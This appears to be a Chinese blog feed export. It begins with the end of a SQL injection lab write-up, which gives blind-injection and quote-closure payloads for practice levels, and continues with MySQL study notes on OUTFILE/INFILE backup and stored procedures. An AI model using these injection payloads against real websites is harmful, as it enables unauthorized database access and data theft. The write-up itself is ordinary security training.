<p>爆数据<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> secret_R69X from <span class="number">64</span>r31rkgr6 ),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">121</span> <span class="keyword">and</span> <span class="string">'a'</span>=<span class="symbol">'a</span></span><br></pre></td></tr></table></figure></p>
<p>但是查看源代码发现这并非本关的闭合方式，闭合的话应该是<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>') <span class="keyword">and</span> <span class="built_in">length</span>(database())=<span class="number">10</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>但是我的payload也是可以的，原因在在于)将我的输入闭合了，这也说明了为什么在我的原payload中不能使用注释符的原因。</p>
<h1 id="LESS-63"><a href="#LESS-63" class="headerlink" title="LESS-63"></a>LESS-63</h1><p>单引号闭合<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>'%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-64"><a href="#LESS-64" class="headerlink" title="LESS-64"></a>LESS-64</h1><p>双括号闭合<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-65"><a href="#LESS-65" class="headerlink" title="LESS-65"></a>LESS-65</h1><p>payload<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1")%23</span><br></pre></td></tr></table></figure></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总算是把所有的关都做完了，本次感慨良多啊。刚开始的时候还特别有激情，后面就不想做了，直到有一天，我制定了一个计划，一天5关，终于坚持下来了，看来做什么事情都要有个计划呀。做完后还是学到了很多的东西的，剩下的话还要练习一下写盲注脚本。</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL学习笔记(七)]]></title>
      <url>/2018/02/18/mysql7/</url>
      <content type="html"><![CDATA[<p>本节介绍MySQL数据库的备份和恢复。</p>
<a id="more"></a>
<h1 id="常用的备份恢复方法"><a href="#常用的备份恢复方法" class="headerlink" title="常用的备份恢复方法"></a><strong>常用的备份恢复方法</strong></h1><p>本节介绍多种备份方法</p>
<h2 id="使用SQL语句：导入导出数据"><a href="#使用SQL语句：导入导出数据" class="headerlink" title="使用SQL语句：导入导出数据"></a><strong>使用SQL语句：导入导出数据</strong></h2><h3 id="1、导出表数据"><a href="#1、导出表数据" class="headerlink" title="1、导出表数据"></a><strong>1、导出表数据</strong></h3><p>SELECT INTO…OUTFILE格式：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'文件名1'</span></span><br><span class="line">[<span class="keyword">FIELDS</span></span><br><span class="line">	[<span class="keyword">TERMINATED</span>(终止) <span class="keyword">BY</span> <span class="string">'string'</span>]</span><br><span class="line">	[[<span class="keyword">OPTIONALLY</span>] <span class="keyword">ENCLOSED</span> <span class="keyword">by</span> <span class="string">'char'</span>]</span><br><span class="line">	[<span class="keyword">ESCAPED</span> <span class="keyword">BY</span> <span class="string">'char'</span>]</span><br><span class="line">]</span><br><span class="line">[<span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'string'</span>]</span><br><span class="line">|<span class="keyword">DUMPFILE</span> <span class="string">'文件名2'</span></span><br></pre></td></tr></table></figure></p>
<p><strong>说明：</strong></p>
<blockquote>
<p>(1)这个语句将select语句选中的行写入到一个文件中，如果要指定特定位置，则要在文件名前加上具体的路径，空值会以’\N’表示<br>(2)FIELDS子句：如果指定了FIELDS子句，那么后面的三个至少要指定一个。<br>1、TERMINATED BY 用来指定字段值之间的的符号，例如，TERMINATED BY <font face="Futura">‘,’</font>，则指定了逗号作为分隔标志，<br>2、ENCOLSED BY 子句用来指定包裹文件中字符值的符号，例如ENCLOSED BY <font face="Futura">‘“‘</font>，表示文件中字符值放在双引号之间，若加上OPTIONALLY表示所有的值都放在双引号之间。<br>3、ESCAPED BY 子句用来指定转义字符，例如，<font face="Futura">“ESCAPED BY ‘*‘”</font> 将<font face="Futura">“*”</font>指定为转义字符，取代<font face="Futura">“\”</font>，如空格将表示为<font face="Futura">“*N”</font>。<br>(3)LINES子句：在LINES子句中使用TERMINATED BY 指定一行结束的标志，比如“LINES TERMINATED BY ‘?’”表示一行以“?”作为结束标志。<br>如果FIELDS和LINES子句都不指定，则默认使用以下子句。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FIELDS TERMINATED BY '\t' ENCLOSED BY '' ESCAPED BY '\\'</span><br><span class="line">LINES TERMINATED BY '\n'</span><br></pre></td></tr></table></figure></p>
<p>如果使用DUMPFILE而不是使用OUTFILE，所导出文件中的所有行都彼此紧挨着放置，值和行之间没有任何标记，，形成了一个长长的值。</p>
</blockquote>
<p><strong>注意：</strong>使用上述语句导出的只是数据的内容，不包括表的结构。</p>
<h3 id="2、导入表数据"><a href="#2、导入表数据" class="headerlink" title="2、导入表数据"></a><strong>2、导入表数据</strong></h3><p>该语句可以将OUTFILE语句导入文件中的数据导入到数据库中。<br>LOAD DATA …INFILE格式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> [<span class="keyword">LOW_PRIORITY</span>|<span class="keyword">CONCURRENT</span>] [<span class="keyword">LOCAL</span>] <span class="keyword">INFILE</span> <span class="string">'文件名.txt'</span></span><br><span class="line">	[<span class="keyword">REPLACE</span>|<span class="keyword">IGNORE</span>]</span><br><span class="line">	<span class="keyword">INTO</span> <span class="keyword">TABLE</span> 表名</span><br><span class="line">	[<span class="keyword">FIELDS</span></span><br><span class="line">		[<span class="keyword">TERMINATED</span>(终止) <span class="keyword">BY</span> <span class="string">'string'</span>]</span><br><span class="line">		[[<span class="keyword">OPTIONALLY</span>] <span class="keyword">ENCLOSED</span> <span class="keyword">by</span> <span class="string">'char'</span>]</span><br><span class="line">		[<span class="keyword">ESCAPED</span> <span class="keyword">BY</span> <span class="string">'char'</span>]</span><br><span class="line">	]</span><br><span class="line">	[<span class="keyword">LINES</span></span><br><span class="line">		[<span class="keyword">STARTING</span> <span class="keyword">BY</span> <span class="string">'string'</span>]</span><br><span class="line">		[<span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'string'</span>]</span><br><span class="line">	]</span><br><span class="line">	[<span class="keyword">IGNORE</span> <span class="built_in">number</span> <span class="keyword">LINES</span>]</span><br><span class="line">	[(列名或用户变量, ...)]</span><br><span class="line">	[<span class="keyword">SET</span> 列名=表达式, ...]</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<blockquote>
<p>LOW_PRIORITY|CONCURRENT：若指定前者，则延迟语句的执行，若指定后者，则当LOAD DATA正在执行的时候，其他线程可以同时使用该表的数据。<br>LOCAL：若指定LOCAL，则文件会被客户主机上的客户端读取，并被发送到服务器，只是执行速度略慢些。<br>文件名.txt：可以带路径指定文件名。<br>REPLACE|IGNORE：如果指定了REPLACE，则当文件中出现与原有行相同的唯一关键字值时，输入行会替换原有行，如果是IGNORE的话会跳过。<br>STARTING指定每行的前缀，如果行中不包括该前缀，则该行被跳过。<br>IGNORE number LINES：可以用来忽略文件的前几行，例如，可以使用IGNORE 1 LINES来跳过第一行。<br>列名或用户变量：当表中列的顺序与文件中字段值顺序不同时，就必须指定一个列清单。<br>SET子句：SET子句可以在导入数据时修改表中列的值。</p>
</blockquote>
<p><strong><font face="隶书">example:</font></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> job=<span class="string">'计算机科学与技术'</span></span><br><span class="line">	<span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:/myfile.txt'</span></span><br><span class="line">		<span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span></span><br><span class="line">			<span class="keyword">optionally</span> <span class="keyword">enclosed</span> <span class="keyword">by</span> <span class="string">'"'</span></span><br><span class="line">		<span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'?'</span>;</span><br></pre></td></tr></table></figure>
<p>执行此语句产生报错：</p>
<blockquote>
<p>ERROR 1290 (HY000): The MySQL server is running with the —secure-file-priv option so it cannot execute this statement</p>
</blockquote>
<p>这是因为MySQL对默认导出的目录有权限限制，使用命令<strong><font face="隶书">show variables like ‘%secure_file%’</font></strong> 可以查看此目录，必须导入到指定目录中才可以。</p>
<blockquote>
<p>secure_file_priv: G:\PHPwamp\wamp64\tmp\</p>
</blockquote>
<p>修改后的语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> job=<span class="string">'计算机科学与技术'</span></span><br><span class="line">	<span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'G:/PHPwamp/wamp64/tmp/myfile.txt'</span></span><br><span class="line">		<span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span></span><br><span class="line">			<span class="keyword">optionally</span> <span class="keyword">enclosed</span> <span class="keyword">by</span> <span class="string">'"'</span></span><br><span class="line">		<span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'?'</span>;</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong>这里的Windows路径名称需要使用正斜杠指定而不是反斜杠。</p>
<p>导入上述数据到新建的xs表中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">'G:/PHPwamp/wamp64/tmp/myfile.txt'</span></span><br><span class="line">	<span class="keyword">into</span> <span class="keyword">table</span> xs</span><br><span class="line">		<span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span></span><br><span class="line">			<span class="keyword">optionally</span> <span class="keyword">enclosed</span> <span class="keyword">by</span> <span class="string">'"'</span></span><br><span class="line">		<span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'?'</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL学习笔记(六)]]></title>
      <url>/2018/02/09/mysql6/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>MySQL自5.0版本之后，开始支持存储过程、存储函数、触发器和事件。这篇文章就来学习一下这个问题。<br><a id="more"></a></p>
<h1 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a><strong>存储过程</strong></h1><p>使用存储过程的优点</p>
<blockquote>
<p>(1) 存储过程在服务器端运行，执行速度快<br>(2) 存储过程执行一次后，期执行计划就会存储在告诉缓冲存储器中，在以后的操作中则会直接调用已编译的二进制代码执行，从而提高了系统性能。<br>(3) 确保数据库安全，使用存储过程即可完成所有数据库操作，可以通过编程方式控制上述操作对数据库信息访问的权限。<br>存储过程实质上相当于函数，所以具有函数的优点。</p>
</blockquote>
<h2 id="创建存储过程"><a href="#创建存储过程" class="headerlink" title="创建存储过程"></a><strong>创建存储过程</strong></h2><p>创建存储过程命令格式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> 存储过程名 ( [参数 ...] )</span><br><span class="line">	[ 特征 ...] 主体</span><br></pre></td></tr></table></figure>
<h3 id="1、存储过程参数"><a href="#1、存储过程参数" class="headerlink" title="1、存储过程参数"></a>1、存储过程参数</h3><p>参数:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ in|out|inout ] 参数名 参数类型    # 输入参数|输出参数|输入/输出参数，相当于input，print等</span><br></pre></td></tr></table></figure></p>
<p>注意：参数的名字不要采用列的名字，否则会引发重名错误。</p>
<h3 id="2、存储过程特征"><a href="#2、存储过程特征" class="headerlink" title="2、存储过程特征"></a>2、存储过程特征</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">	language SQL</span><br><span class="line">| [not] deterministic</span><br><span class="line">| &#123;contains sql|no sql|reads sql data|modifies sql data&#125;</span><br><span class="line">| sql security &#123;definer|invoker&#125;</span><br><span class="line">| <span class="keyword">comment</span> <span class="string">'string'</span></span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<blockquote>
<p><em>language SQL：</em>表名编写这个的语言为SQL语言，指定编程语言，目前仅支持SQL语言。故此选项不可指定<br><em>deterministic：</em>对同样的输入参数输出相同的结果，加 <code>not</code> 参数会产生不确定的结果，默认为 <code>not deterministic</code><br><em>contains sql：</em>表示存储过程不包含读或写数据的语句， <code>reads sql data</code> 表示存储过程包含读数据的语句，但不包含写的数据。 <code>modifies sql data</code> 表示存储过程包含写数据的语句。默认的是 <code>contains sql</code>。<br><em>sql security：</em>定义使用该存储过程的用户的许可。 <code>definer</code>创建者， <code>invoker</code>调用者。<br><em>comment ‘string’：</em>对存储过程的描述， <code>string</code>为描述内容。可以使用命令 <code>show create procedure</code> 来显示。</p>
</blockquote>
<h3 id="3、存储过程主体"><a href="#3、存储过程主体" class="headerlink" title="3、存储过程主体"></a>3、存储过程主体</h3><p>存储过程主体包含了在过程调用的时候必须执行的语句，这个部分总是以<em>begin</em>开始，以<em>end</em>结束，如果包含多个语句，则以分号作为结束符，当然，如果只有一句语句的话则不必指定<em>begin-end</em>语句。</p>
<p>服务器处理语句的时候是以分号作为结束符，如果以分号作为每个语句的结束符，那么执行一条语句就会遇到分号则会认为执行结束，这显然无法执行后面的指令，所以需要用”delimiter 结束符”将结束符改为其他符号。</p>
<p>用存储过程实现删除一个特定学生的信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delimiter $$</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> delete_student(<span class="keyword">in</span> xh <span class="built_in">char</span>(<span class="number">6</span>))</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">delete</span> <span class="keyword">from</span> xs <span class="keyword">where</span> 学号=xh;</span><br><span class="line"><span class="keyword">end</span> $$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure>
<h2 id="存储过程体"><a href="#存储过程体" class="headerlink" title="存储过程体"></a><strong>存储过程体</strong></h2><p>在存储过程中可以使用所有的SQL语句类型，也包括变量的定义和赋值。</p>
<h3 id="1、局部变量"><a href="#1、局部变量" class="headerlink" title="1、局部变量"></a>1、局部变量</h3><p>在存储过程可以声明局部变量，可以用来存储临时结果，如果不赋初值的话则默认为NULL。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> 变量名 ...类型 [默认值]</span><br></pre></td></tr></table></figure>
<p><strong><font face="隶书">example</font></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="keyword">num</span> <span class="built_in">int</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">declare</span> str1,str2 <span class="built_in">varchar</span>(<span class="number">6</span>);</span><br></pre></td></tr></table></figure>
<p>局部变量只可以在begin-end语句块中声明，并且必须在存储过程的开头。声明完后也只能在该b-e块中使用，不能再其它块中使用。当然，也可以创建 <em>用户变量</em> ，只要在前面加@符号，用户变量存在于整个回话之中。</p>
<h3 id="2、使用set语句赋值"><a href="#2、使用set语句赋值" class="headerlink" title="2、使用set语句赋值"></a>2、使用set语句赋值</h3><p>格式：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> 变量名=表达式 [,变量名=表达式] ...</span><br></pre></td></tr></table></figure></p>
<p><strong><font face="隶书">example</font></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">num</span>=<span class="number">1</span>, str1=<span class="string">'hello'</span>;</span><br></pre></td></tr></table></figure>
<h3 id="3、select…into语句"><a href="#3、select…into语句" class="headerlink" title="3、select…into语句"></a>3、select…into语句</h3><p>使用这个语句可以把选定的列值直接存储到变量中。因此，返回结果只能有一行。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 列名[,...] <span class="keyword">into</span> 变量名 [,...] table_expr</span><br></pre></td></tr></table></figure>
<p><code>table_expr</code>指select语句中的from子句及后面的部分。</p>
<p><strong><font face="隶书">example</font></strong></p>
<p>例如，在存储过程中，将xs表中的学号为081101的学生姓名和专业名的值分别赋给变量name和project。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 姓名,专业名 <span class="keyword">into</span> <span class="keyword">name</span>,<span class="keyword">project</span></span><br><span class="line">	<span class="keyword">from</span> xs;</span><br><span class="line">	where 学号='081101';</span><br></pre></td></tr></table></figure>
<p>注意：该语句只能在存储过程中使用，而且变量名name和project需要在使用之前声明。</p>
<h3 id="4、流程控制语句"><a href="#4、流程控制语句" class="headerlink" title="4、流程控制语句"></a>4、流程控制语句</h3><p>在MySQL语句中，可以使用过程式语句。</p>
<h4 id="1-if语句"><a href="#1-if语句" class="headerlink" title="1) if语句"></a>1) if语句</h4><p>格式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if 条件 then 语句</span><br><span class="line">[elseif 条件 then 语句] ...</span><br><span class="line">[else 语句]</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span></span><br></pre></td></tr></table></figure>
<p><strong><font face="隶书">example</font></strong></p>
<p>对于一个数据库，判断两个输入的参数哪一个更大。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">delimiter $$</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> xscj.compar</span><br><span class="line">	(<span class="keyword">in</span> kl interger,<span class="keyword">in</span> k2 interger,<span class="keyword">out</span> k3 <span class="built_in">char</span>(<span class="number">6</span>))</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">if</span> k1&gt;k2 <span class="keyword">then</span></span><br><span class="line">		<span class="keyword">set</span> k3=<span class="string">'大于'</span>;</span><br><span class="line">	elseif k1=k2 then</span><br><span class="line">		<span class="keyword">set</span> k3=<span class="string">'等于'</span>;</span><br><span class="line">	else</span><br><span class="line">		<span class="keyword">set</span> k3=<span class="string">'小于'</span>;</span><br><span class="line">	<span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span>$$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure>
<h4 id="2-case语句"><a href="#2-case语句" class="headerlink" title="2) case语句"></a>2) case语句</h4><p>格式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CASE case_value</span><br><span class="line">	WHEN when_value THEN 语句</span><br><span class="line">	[WHEN when_value THEN 语句] ...</span><br><span class="line">	[ELSE 语句]</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">CASE</span></span><br></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CASE</span><br><span class="line">	WHEN 条件 THEN 语句</span><br><span class="line">	[WHEN 条件 THEN 语句] ...</span><br><span class="line">	[ELSE 语句]</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">CASE</span></span><br></pre></td></tr></table></figure></p>
<p><strong><font face="隶书">example</font></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">delimiter $$</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> xscj.result</span><br><span class="line">	(<span class="keyword">in</span> <span class="keyword">str</span> <span class="built_in">varchar</span>(<span class="number">4</span>),<span class="keyword">out</span> sex <span class="built_in">varchar</span>(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">case</span> <span class="keyword">str</span></span><br><span class="line">		<span class="keyword">when</span> <span class="string">'m'</span> <span class="keyword">then</span> <span class="keyword">set</span> sex=<span class="string">'男'</span>;</span><br><span class="line">		when 'f' then <span class="keyword">set</span> sex=<span class="string">'女'</span>;</span><br><span class="line">		else <span class="keyword">set</span> sex=<span class="string">'无'</span>;</span><br><span class="line">	<span class="keyword">end</span> <span class="keyword">case</span>;</span><br><span class="line"><span class="keyword">end</span> $$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">case</span><br><span class="line">	when str='m' then <span class="keyword">set</span> sex=<span class="string">'男'</span>;</span><br><span class="line">	when str='f' then <span class="keyword">set</span> sex=<span class="string">'女'</span>;</span><br><span class="line">	else <span class="keyword">set</span> sex=<span class="string">'无'</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">case</span>;</span><br></pre></td></tr></table></figure>
<h4 id="3-循环语句"><a href="#3-循环语句" class="headerlink" title="3) 循环语句"></a>3) 循环语句</h4><h5 id="while语句格式"><a href="#while语句格式" class="headerlink" title="while语句格式"></a><strong><font face="宋体">while</font>语句格式</strong></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[begin_label:]</span><br><span class="line">WHILE 条件 <span class="keyword">DO</span></span><br><span class="line">	语句</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">WHILE</span> [end_label]</span><br></pre></td></tr></table></figure>
<p>注意：b-e label必须同时出现，并且label必须相同。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">delimiter $$</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> dowhile()</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">declare</span> v1 <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">5</span>;</span><br><span class="line">	while v1&gt;0 do</span><br><span class="line">		<span class="keyword">set</span> v1=v1<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">end</span> <span class="keyword">while</span>;</span><br><span class="line"><span class="keyword">end</span>$$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure>
<h5 id="repeat语句格式"><a href="#repeat语句格式" class="headerlink" title="repeat语句格式"></a><strong><font face="宋体">repeat</font>语句格式</strong></h5><figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[begin_label:]</span><br><span class="line"><span class="keyword">REPEAT</span></span><br><span class="line">	语句</span><br><span class="line">	<span class="keyword">UNTIL</span> 条件</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">REPEAT</span> [end_label]</span><br></pre></td></tr></table></figure>
<p><strong><font face="隶书">example</font></strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">repeat</span><br><span class="line">	v1=v1-1;</span><br><span class="line">	until v1&lt;1;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">repeat</span>;</span><br></pre></td></tr></table></figure></p>
<h5 id="LOOP语句格式"><a href="#LOOP语句格式" class="headerlink" title="LOOP语句格式"></a><strong><font face="隶书">LOOP</font>语句格式</strong></h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[begin_label:]</span><br><span class="line"><span class="keyword">LOOP</span></span><br><span class="line">	语句</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">LOOP</span> [end_label]</span><br></pre></td></tr></table></figure>
<p><em>loop</em> 允许某特定语句或语句群的重复执行，想要退出的话可以用一个<em>leave</em>语句。</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEAVE <span class="keyword">label</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
<p><strong><font face="隶书">example</font></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">delimiter $$</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> doloop()</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">set</span> @a=<span class="number">10</span>;</span><br><span class="line">	label:loop</span><br><span class="line">		<span class="keyword">set</span> @a=@a<span class="number">-1</span>;</span><br><span class="line">		if @a&lt;0 then</span><br><span class="line">			leave label;</span><br><span class="line">		<span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line">	<span class="keyword">end</span> <span class="keyword">loop</span> label;</span><br><span class="line"><span class="keyword">end</span>$$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure>
<h5 id="iterate语句"><a href="#iterate语句" class="headerlink" title="iterate语句"></a><strong><font face="宋体">iterate</font>语句</strong></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ITERATE label</span><br></pre></td></tr></table></figure>
<p>这个语句意为”再次循环”，指重新开始一个循环，与continue的含义类似。</p>
<h3 id="5、处理程序和条件"><a href="#5、处理程序和条件" class="headerlink" title="5、处理程序和条件"></a>5、处理程序和条件</h3><h3 id="6、游标"><a href="#6、游标" class="headerlink" title="6、游标"></a>6、游标</h3><p>一条select…into语句返回的是带有值的一行，如果想要处理返回的多行数据，则可以使用游标。</p>
